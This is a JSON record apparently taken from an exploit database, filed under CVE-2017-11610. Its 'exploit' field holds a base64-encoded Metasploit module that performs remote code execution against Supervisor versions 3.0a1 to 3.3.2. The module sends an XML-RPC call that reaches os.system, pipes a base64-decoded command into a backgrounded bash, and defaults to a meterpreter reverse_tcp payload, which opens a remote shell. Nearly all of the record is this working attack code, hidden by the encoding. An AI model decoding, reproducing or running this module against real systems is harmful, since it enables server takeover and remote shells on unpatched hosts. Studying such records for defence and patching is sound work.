{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQoNCmNsYXNzIE1ldGFzcGxvaXRNb2R1bGUgPCBNc2Y6OkV4cGxvaXQ6OlJlbW90ZQ0KICBSYW5rID0gRXhjZWxsZW50UmFua2luZw0KDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6Okh0dHBDbGllbnQNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OkNtZFN0YWdlcg0KDQogIGRlZiBpbml0aWFsaXplKGluZm89e30pDQogICAgc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCiAgICAgICdOYW1lJyAgICAgICAgICAgPT4gIlN1cGVydmlzb3IgWE1MLVJQQyBBdXRoZW50aWNhdGVkIFJlbW90ZSBDb2RlIEV4ZWN1dGlvbiIsDQogICAgICAnRGVzY3JpcHRpb24nICAgID0+ICVxew0KICAgICAgICBUaGlzIG1vZHVsZSBleHBsb2l0cyBhIHZ1bG5lcmFiaWxpdHkgaW4gdGhlIFN1cGVydmlzb3IgcHJvY2VzcyBjb250cm9sIHNvZnR3YXJlLCB3aGVyZSBhbiBhdXRoZW50aWNhdGVkIGNsaWVudA0KICAgICAgICBjYW4gc2VuZCBhIG1hbGljaW91cyBYTUwtUlBDIHJlcXVlc3QgdG8gc3VwZXJ2aXNvcmQgdGhhdCB3aWxsIHJ1biBhcmJpdHJhcnkgc2hlbGwgY29tbWFuZHMgb24gdGhlIHNlcnZlci4NCiAgICAgICAgVGhlIGNvbW1hbmRzIHdpbGwgYmUgcnVuIGFzIHRoZSBzYW1lIHVzZXIgYXMgc3VwZXJ2aXNvcmQuIERlcGVuZGluZyBvbiBob3cgc3VwZXJ2aXNvcmQgaGFzIGJlZW4gY29uZmlndXJlZCwgdGhpcw0KICAgICAgICBtYXkgYmUgcm9vdC4gVGhpcyB2dWxuZXJhYmlsaXR5IGNhbiBvbmx5IGJlIGV4cGxvaXRlZCBieSBhbiBhdXRoZW50aWNhdGVkIGNsaWVudCwgb3IgaWYgc3VwZXJ2aXNvcmQgaGFzIGJlZW4NCiAgICAgICAgY29uZmlndXJlZCB0byBydW4gYW4gSFRUUCBzZXJ2ZXIgd2l0aG91dCBhdXRoZW50aWNhdGlvbi4gVGhpcyB2dWxuZXJhYmlsaXR5IGFmZmVjdHMgdmVyc2lvbnMgMy4wYTEgdG8gMy4zLjIuDQogICAgICB9LA0KICAgICAgJ0xpY2Vuc2UnICAgICAgICA9PiBNU0ZfTElDRU5TRSwNCiAgICAgICdBdXRob3InICAgICAgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgICdDYWx1bSBIdXR0b24gPGMuZS5odXR0b25AZ214LmNvbT4nDQogICAgICAgIF0sDQogICAgICAnUmVmZXJlbmNlcycgICAgID0+DQogICAgICAgIFsNCiAgICAgICAgICBbJ1VSTCcsICdodHRwczovL2dpdGh1Yi5jb20vU3VwZXJ2aXNvci9zdXBlcnZpc29yL2lzc3Vlcy85NjQnXSwNCiAgICAgICAgICBbJ1VSTCcsICdodHRwczovL3d3dy5kZWJpYW4ub3JnL3NlY3VyaXR5LzIwMTcvZHNhLTM5NDInXSwNCiAgICAgICAgICBbJ1VSTCcsICdodHRwczovL2N2ZS5taXRyZS5vcmcvY2dpLWJpbi9jdmVuYW1lLmNnaT9uYW1lPUNWRS0yMDE3LTExNjEwJ10sDQogICAgICAgICAgWydVUkwnLCAnaHR0cHM6Ly9naXRodWIuY29tL3BoaXRoMG4vdnVsaHViL3RyZWUvbWFzdGVyL3N1cGVydmlzb3IvQ1ZFLTIwMTctMTE2MTAnXSwNCiAgICAgICAgICBbJ0NWRScsICcyMDE3LTExNjEwJ10NCiAgICAgICAgXSwNCiAgICAgICdQbGF0Zm9ybScgICAgICAgPT4gJ2xpbnV4JywNCiAgICAgICdUYXJnZXRzJyAgICAgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgIFsnMy4wYTEtMy4zLjInLCB7fV0NCiAgICAgICAgXSwNCiAgICAgICdBcmNoJyAgICAgICAgICAgPT4gWyBBUkNIX1g4NiwgQVJDSF9YNjQgXSwNCiAgICAgICdEZWZhdWx0T3B0aW9ucycgPT4NCiAgICAgICAgew0KICAgICAgICAgICdSUE9SVCcgICAgICAgICA9PiA5MDAxLA0KICAgICAgICAgICdQYXlsb2FkJyAgICAgICA9PiAnbGludXgveDY0L21ldGVycHJldGVyL3JldmVyc2VfdGNwJywNCiAgICAgICAgfSwNCiAgICAgICdQcml2aWxlZ2VkJyAgICAgPT4gZmFsc2UsDQogICAgICAnRGlzY2xvc3VyZURhdGUnID0+ICdKdWwgMTkgMjAxNycsDQogICAgICAnRGVmYXVsdFRhcmdldCcgID0+IDANCiAgICApKQ0KDQogICAgcmVnaXN0ZXJfb3B0aW9ucygNCiAgICAgIFsNCiAgICAgICAgT3B0OjpSUE9SVCg5MDAxKSwNCiAgICAgICAgT3B0U3RyaW5nLm5ldygnSHR0cFVzZXJuYW1lJywgW2ZhbHNlLCAnVXNlcm5hbWUgZm9yIEhUVFAgYmFzaWMgYXV0aCddKSwNCiAgICAgICAgT3B0U3RyaW5nLm5ldygnSHR0cFBhc3N3b3JkJywgW2ZhbHNlLCAnUGFzc3dvcmQgZm9yIEhUVFAgYmFzaWMgYXV0aCddKSwNCiAgICAgICAgT3B0U3RyaW5nLm5ldygnVEFSR0VUVVJJJywgW3RydWUsICdUaGUgcGF0aCB0byB0aGUgWE1MLVJQQyBlbmRwb2ludCcsICcvUlBDMiddKSwNCiAgICAgIF0NCiAgICApDQogIGVuZA0KDQogIGRlZiBjaGVja192ZXJzaW9uKHZlcnNpb24pDQogICAgaWYgdmVyc2lvbiA8PSBHZW06OlZlcnNpb24ubmV3KCczLjMuMicpIGFuZCB2ZXJzaW9uID49IEdlbTo6VmVyc2lvbi5uZXcoJzMuMGExJykNCiAgICAgIHJldHVybiB0cnVlDQogICAgZWxzZQ0KICAgICAgcmV0dXJuIGZhbHNlDQogICAgZW5kDQogIGVuZA0KDQogIGRlZiBjaGVjaw0KDQogICAgcHJpbnRfc3RhdHVzKCdFeHRyYWN0aW5nIHZlcnNpb24gZnJvbSB3ZWIgaW50ZXJmYWNlLi4nKQ0KDQogICAgcGFyYW1zID0gew0KICAgICAgJ21ldGhvZCcgICAgPT4gJ0dFVCcsDQogICAgICAndXJpJyAgICAgICA9PiBub3JtYWxpemVfdXJpKCcvJykNCiAgICB9DQogICAgaWYgIWRhdGFzdG9yZVsnSHR0cFVzZXJuYW1lJ10udG9fcy5lbXB0eT8gYW5kICFkYXRhc3RvcmVbJ0h0dHBQYXNzd29yZCddLnRvX3MuZW1wdHk/DQogICAgICBwcmludF9zdGF0dXMoIlVzaW5nIGJhc2ljIGF1dGggKCN7ZGF0YXN0b3JlWydIdHRwVXNlcm5hbWUnXX06I3tkYXRhc3RvcmVbJ0h0dHBQYXNzd29yZCddfSkiKQ0KICAgICAgcGFyYW1zLm1lcmdlISh7J2F1dGhvcml6YXRpb24nID0+IGJhc2ljX2F1dGgoZGF0YXN0b3JlWydIdHRwVXNlcm5hbWUnXSwgZGF0YXN0b3JlWydIdHRwUGFzc3dvcmQnXSl9KQ0KICAgIGVuZA0KICAgIHJlcyA9IHNlbmRfcmVxdWVzdF9jZ2kocGFyYW1zKQ0KDQogICAgaWYgcmVzDQogICAgICBpZiByZXMuY29kZSA9PSAyMDANCiAgICAgICAgbWF0Y2ggPSByZXMuYm9keS5tYXRjaCgvPHNwYW4+KFxkK1wuW1xkYWJdXC5cZCspPFwvc3Bhbj4vKQ0KICAgICAgICBpZiBtYXRjaA0KICAgICAgICAgIHZlcnNpb24gPSBHZW06OlZlcnNpb24ubmV3KG1hdGNoWzFdKQ0KICAgICAgICAgIGlmIGNoZWNrX3ZlcnNpb24odmVyc2lvbikNCiAgICAgICAgICAgIHByaW50X2dvb2QoIlZ1bG5lcmFibGUgdmVyc2lvbiBmb3VuZDogI3t2ZXJzaW9ufSIpDQogICAgICAgICAgICByZXR1cm4gRXhwbG9pdDo6Q2hlY2tDb2RlOjpBcHBlYXJzDQogICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgcHJpbnRfYmFkKCJWZXJzaW9uICN7dmVyc2lvbn0gaXMgbm90IHZ1bG5lcmFibGUiKQ0KICAgICAgICAgICAgcmV0dXJuIEV4cGxvaXQ6OkNoZWNrQ29kZTo6U2FmZQ0KICAgICAgICAgIGVuZA0KICAgICAgICBlbHNlDQogICAgICAgICAgcHJpbnRfYmFkKCdDb3VsZCBub3QgZXh0cmFjdCB2ZXJzaW9uIG51bWJlciBmcm9tIHdlYiBpbnRlcmZhY2UnKQ0KICAgICAgICAgIHJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OlVua25vd24NCiAgICAgICAgZW5kDQogICAgICBlbHNpZiByZXMuY29kZSA9PSA0MDENCiAgICAgICAgcHJpbnRfYmFkKCJBdXRoZW50aWNhdGlvbiBmYWlsZWQ6ICN7cmVzLmNvZGV9IHJlc3BvbnNlIikNCiAgICAgICAgcmV0dXJuIEV4cGxvaXQ6OkNoZWNrQ29kZTo6U2FmZQ0KICAgICAgZWxzZQ0KICAgICAgICBwcmludF9iYWQoIlVuZXhwZWN0ZWQgSFRUUCBjb2RlOiAje3Jlcy5jb2RlfSByZXNwb25zZSIpDQogICAgICAgIHJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OlVua25vd24NCiAgICAgIGVuZA0KICAgIGVsc2UNCiAgICAgIHByaW50X2JhZCgnRXJyb3IgY29ubmVjdGluZyB0byB3ZWIgaW50ZXJmYWNlJykNCiAgICAgIHJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OlVua25vd24NCiAgICBlbmQNCg0KICBlbmQNCg0KICBkZWYgZXhlY3V0ZV9jb21tYW5kKGNtZCwgb3B0cyA9IHt9KQ0KDQogICAgIyBYTUwtUlBDIHBheWxvYWQgdGVtcGxhdGUsIHVzZSBub2h1cCBhbmQgJiB0byBkZXRhY2ggYW5kIGJhY2tncm91bmQgdGhlIHByb2Nlc3Mgc28gaXQgZG9lc250IGhhbmd1cCB0aGUgd2ViIHNlcnZlcg0KICAgICMgQ3JlZGl0IHRvIHRoZSBmb2xsb3dpbmcgdXJscyBmb3IgdGhlIG9zLnN5c3RlbSgpIHBheWxvYWQNCiAgICAjIGh0dHBzOi8vZ2l0aHViLmNvbS9waGl0aDBuL3Z1bGh1Yi90cmVlL21hc3Rlci9zdXBlcnZpc29yL0NWRS0yMDE3LTExNjEwDQogICAgIyBodHRwczovL3d3dy5sZWF2ZXNvbmdzLmNvbS9QRU5FVFJBVElPTi9zdXBlcnZpc29yZC1SQ0UtQ1ZFLTIwMTctMTE2MTAuaHRtbA0KICAgIHhtbF9wYXlsb2FkID0gJXs8P3htbCB2ZXJzaW9uPSIxLjAiPz4NCjxtZXRob2RDYWxsPg0KICA8bWV0aG9kTmFtZT5zdXBlcnZpc29yLnN1cGVydmlzb3JkLm9wdGlvbnMud2FybmluZ3MubGluZWNhY2hlLm9zLnN5c3RlbTwvbWV0aG9kTmFtZT4NCiAgPHBhcmFtcz4NCiAgICA8cGFyYW0+DQogICAgICA8c3RyaW5nPmVjaG8gLW4gI3tSZXg6OlRleHQuZW5jb2RlX2Jhc2U2NChjbWQpfXxiYXNlNjQgLWR8bm9odXAgYmFzaCA+IC9kZXYvbnVsbCAyPiYxICY8L3N0cmluZz4NCiAgICA8L3BhcmFtPg0KICA8L3BhcmFtcz4NCjwvbWV0aG9kQ2FsbD59DQoNCiAgICAjIFNlbmQgdGhlIFhNTC1SUEMgcGF5bG9hZCB2aWEgUE9TVCB0byB0aGUgc3BlY2lmaWVkIGVuZHBvaW50DQogICAgZW5kcG9pbnRfcGF0aCA9IHRhcmdldF91cmkucGF0aA0KICAgIHByaW50X3N0YXR1cygiU2VuZGluZyBYTUwtUlBDIHBheWxvYWQgdmlhIFBPU1QgdG8gI3twZWVyfSN7ZGF0YXN0b3JlWydUQVJHRVRVUkknXX0iKQ0KDQogICAgcGFyYW1zID0gew0KICAgICAgJ21ldGhvZCcgICAgICAgID0+ICdQT1NUJywNCiAgICAgICd1cmknICAgICAgICAgICA9PiBub3JtYWxpemVfdXJpKGVuZHBvaW50X3BhdGgpLA0KICAgICAgJ2N0eXBlJyAgICAgICAgID0+ICd0ZXh0L3htbCcsDQogICAgICAnaGVhZGVycycgICAgICAgPT4geydBY2NlcHQnID0+ICd0ZXh0L3htbCd9LA0KICAgICAgJ2RhdGEnICAgICAgICAgID0+IHhtbF9wYXlsb2FkLA0KICAgICAgJ2VuY29kZV9wYXJhbXMnID0+IGZhbHNlDQogICAgfQ0KICAgIGlmICFkYXRhc3RvcmVbJ0h0dHBVc2VybmFtZSddLnRvX3MuZW1wdHk/IGFuZCAhZGF0YXN0b3JlWydIdHRwUGFzc3dvcmQnXS50b19zLmVtcHR5Pw0KICAgICAgcHJpbnRfc3RhdHVzKCJVc2luZyBiYXNpYyBhdXRoICgje2RhdGFzdG9yZVsnSHR0cFVzZXJuYW1lJ119OiN7ZGF0YXN0b3JlWydIdHRwUGFzc3dvcmQnXX0pIikNCiAgICAgIHBhcmFtcy5tZXJnZSEoeydhdXRob3JpemF0aW9uJyA9PiBiYXNpY19hdXRoKGRhdGFzdG9yZVsnSHR0cFVzZXJuYW1lJ10sIGRhdGFzdG9yZVsnSHR0cFBhc3N3b3JkJ10pfSkNCiAgICBlbmQNCiAgICByZXR1cm4gc2VuZF9yZXF1ZXN0X2NnaShwYXJhbXMsIHRpbWVvdXQ9NSkNCg0KICBlbmQNCg0KICBkZWYgZXhwbG9pdA0KDQogICAgcmVzID0gZXhlY3V0ZV9jbWRzdGFnZXIoOmxpbmVtYXggPT4gODAwKQ0KDQogICAgaWYgcmVzDQogICAgICBpZiByZXMuY29kZSA9PSA0MDENCiAgICAgICAgZmFpbF93aXRoKEZhaWx1cmU6Ok5vQWNjZXNzLCAiQXV0aGVudGljYXRpb24gZmFpbGVkOiAje3Jlcy5jb2RlfSByZXNwb25zZSIpDQogICAgICBlbHNpZiByZXMuY29kZSA9PSA0MDQNCiAgICAgICAgZmFpbF93aXRoKEZhaWx1cmU6Ok5vdEZvdW5kLCAiSW52YWxpZCBYTUwtUlBDIGVuZHBvaW50OiAje3Jlcy5jb2RlfSByZXNwb25zZSIpDQogICAgICBlbHNlDQogICAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpVbmV4cGVjdGVkUmVwbHksICJVbmV4cGVjdGVkIEhUVFAgY29kZTogI3tyZXMuY29kZX0gcmVzcG9uc2UiKQ0KICAgICAgZW5kDQogICAgZWxzZQ0KICAgICAgcHJpbnRfZ29vZCgnUmVxdWVzdCByZXR1cm5lZCB3aXRob3V0IHN0YXR1cyBjb2RlLCB1c3VhbGx5IGluZGljYXRlcyBzdWNjZXNzLiBQYXNzaW5nIHRvIGhhbmRsZXIuLicpDQogICAgICBoYW5kbGVyDQogICAgZW5kDQoNCiAgZW5kDQoNCmVuZA==", 
    "filename": "platforms/linux/remote/42779.rb", 
    "id": "42779", 
    "cves": [
        "CVE-2017-11610"
    ]
}